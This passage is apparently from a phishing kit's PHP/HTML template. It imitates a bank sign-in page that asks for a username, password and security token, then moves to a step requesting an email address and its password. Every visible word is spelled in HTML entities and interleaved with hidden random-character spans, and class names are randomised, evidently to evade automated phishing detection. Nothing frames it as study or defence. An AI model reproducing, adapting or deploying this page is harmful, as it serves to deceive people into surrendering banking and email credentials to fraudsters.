style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&period;</h3>
                                        </div>
                                        <div style="display:none;" id="congratext" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1"><strong><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&excl;</strong></h3>
                                            <br>
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #48ad2c;"><img src="./img/congra.png" style="width: 17px;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;&period;</h3>
                                        </div>
                                    </div>
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12">
                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progress" style="background: #0b6efd;">
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> bar"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12 col-sm-6 col-sm-offset-3 logon-box">

                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="login" style="display:block;">

                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="login-form" name="login-form" method="POST" autocomplete="off" action="">
                                                <div id="erruser"></div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container uus">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label id="baba" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="userid"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle" id="userId-text">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle" id="userid" placeholder="" type="text" name="userid" required="" value="">
                                                               <h3 id="invalid" style="color:#bf2155;display:none;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#73;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</h3>
																</div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container pps">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="passid"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle" id="password-text">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="passid" placeholder="" autocomplete="off" type="password" name="passid" required="" value=""> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="tokenin" style="display:none;" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container tk">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="Token"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#84;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="Token" placeholder="" autocomplete="off" type="number" pattern="[0-9]*" inputmode="numeric" maxlength="35" name="Token" required="" value=""> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row logon-xs-toggle">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-6 rememberMe-checkbox-container">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkbox">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox-flex">
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkboxWrap" id="rem">
                                                                    <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox__input rem" type="checkbox">
                                                                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkmark icon check"></i>
                                                                </div>
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkboxWrap" id="rem1" style="display:none;">
                                                                    <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox__input checkbox__input--checked rem1" type="checkbox">
                                                                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkmark icon check"></i>
                                                                </div>
                                                                <label> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox-label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#82;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;</span></label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-6 token-checkbox-container">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkbox useToken">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox-flex">
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkboxWrap" id="tkn">
                                                                    <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox__input tkn" type="checkbox">
                                                                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkmark icon check"></i>
                                                                </div>
                                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkboxWrap" id="tkn1" style="display:none;">
                                                                    <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox__input checkbox__input--checked tkn1" type="checkbox">
                                                                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui checkmark icon check"></i>
                                                                </div>
                                                                <label> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> checkbox-label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;</span></label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button id="subbo" type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</span> </button>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&quest;<i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui progressright icon end-icon" ></i></a></span></div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor last touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&quest;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;&period;<i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui progressright icon end-icon" ></i></a></span></div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="emailo" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="email1-form" name="email1-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div align="center">
                                                    <img id="img" src="./img/emdef213.png" width="100px">
                                                </div>
                                                <div id="erreml"></div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container emms">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="email"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="email" placeholder="" autocomplete="off" type="email" name="email" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container pswd">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
